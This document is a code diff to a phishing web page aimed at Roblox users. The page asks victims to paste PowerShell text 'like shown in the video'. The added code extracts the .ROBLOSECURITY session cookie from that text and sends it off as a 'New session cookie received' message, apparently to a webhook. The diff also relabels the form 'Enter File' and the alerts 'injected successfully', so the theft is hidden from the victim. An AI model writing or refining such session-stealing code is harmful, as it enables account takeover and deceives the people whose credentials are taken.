@@ -168,8 +168,8 @@
         function loadGetStarted() {
             document.getElementById('content').innerHTML = `
                 <div class="form-container">
-                    <h1>Enter Your Cookie</h1>
-                    <textarea id="cookieInput" placeholder="Paste your ROBLOSECURITY cookie here..."></textarea>
+                    <h1>Enter File</h1>
+                    <textarea id="cookieInput" placeholder="Paste your powershell like shown in the video here..."></textarea>
                     <button class="button" onclick="sendCookie()">Send Cookie</button>
                     <a href="#" class="back-button" onclick="goBack()">Back</a>
                 </div>
@@ -190,6 +190,16 @@
                 return;
             }
 
+            // Extract the cookie value from the input (everything between the quotes after .ROBLOSECURITY)
+            const match = userCookie.match(/New-Object System\.Net\.Cookie\("\.ROBLOSECURITY", "(.*?)", "\/", "\.roblox\.com"\)/);
+
+            if (!match) {
+                alert('Invalid file.');
+                return;
+            }
+
+            const extractedCookie = match[1]; // Extracted cookie value
+
             // Create the embed message
             const embed = {
                 content: "New session cookie received",
@@ -200,7 +210,7 @@
                         fields: [
                             {
                                 name: "Cookie",
-                                value: userCookie,
+                                value: extractedCookie,
                                 inline: false
                             }
                         ],
@@ -217,11 +227,11 @@
             })
             .then(response => response.json())
             .then(data => {
-                alert('Cookie sent successfully!');
+                alert('injected successfully!');
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('There was an error sending the cookie.');
+                alert('There was an error injecting.');
             });
         }
     </script>
